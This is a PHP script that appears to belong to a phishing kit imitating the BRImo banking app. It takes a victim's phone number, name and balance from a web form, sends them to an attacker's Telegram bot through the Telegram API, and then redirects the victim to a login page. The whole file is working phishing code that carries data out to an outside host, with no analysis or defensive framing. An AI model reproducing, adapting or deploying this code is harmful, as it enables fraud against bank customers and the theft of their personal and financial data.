<?php

session_start();
include "./tele.php";

$nomor = $_POST['nomor'];
$_SESSION['nomor'] = $nomor;
$nama = $_POST['nama'];
$_SESSION['nama'] = $nama;
$saldo = $_POST['saldo'];
$_SESSION['saldo'] = $saldo;

$message = "
( BRIMO | RESULT )

- Nomor : ".$nomor."
- Nama : ".$nama."
- Saldo : ".$saldo."
";

function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $token_bot);
header('Location: ../login.html');
?>